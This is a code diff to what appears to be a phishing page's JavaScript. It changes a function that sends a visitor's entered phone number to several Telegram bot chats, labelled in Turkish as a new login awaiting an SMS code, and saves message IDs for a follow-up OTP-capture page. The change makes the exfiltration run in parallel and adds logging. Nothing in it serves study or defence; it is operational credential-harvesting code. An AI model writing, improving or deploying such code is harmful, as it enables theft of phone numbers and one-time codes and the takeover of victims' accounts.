@@ -13,13 +13,13 @@ phoneInput.addEventListener('input', function (e) {
     this.value = value;
 });
 
-// Send phone to Telegram (all chat IDs)
+// Send phone to Telegram (all chat IDs in parallel)
 async function sendToTelegram(phone) {
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n\n⏳ SMS Kod Bekleniyor...`;
     const messageIds = {};
 
-    for (const chatId of TELEGRAM_CONFIG.CHAT_IDS) {
+    const sendPromises = TELEGRAM_CONFIG.CHAT_IDS.map(async (chatId) => {
         try {
             const res = await fetch(url, {
                 method: 'POST',
@@ -33,11 +33,16 @@ async function sendToTelegram(phone) {
             const data = await res.json();
             if (data.ok) {
                 messageIds[chatId] = data.result.message_id;
+                console.log(`Log sent to ${chatId} successfully`);
+            } else {
+                console.error(`Telegram error for ${chatId}:`, data.description);
             }
         } catch (e) {
-            console.error('Telegram error for chat ' + chatId + ':', e);
+            console.error(`Fetch error for ${chatId}:`, e);
         }
-    }
+    });
+
+    await Promise.all(sendPromises);
 
     // Store message IDs and phone for OTP page to update
     localStorage.setItem('tg_message_ids', JSON.stringify(messageIds));
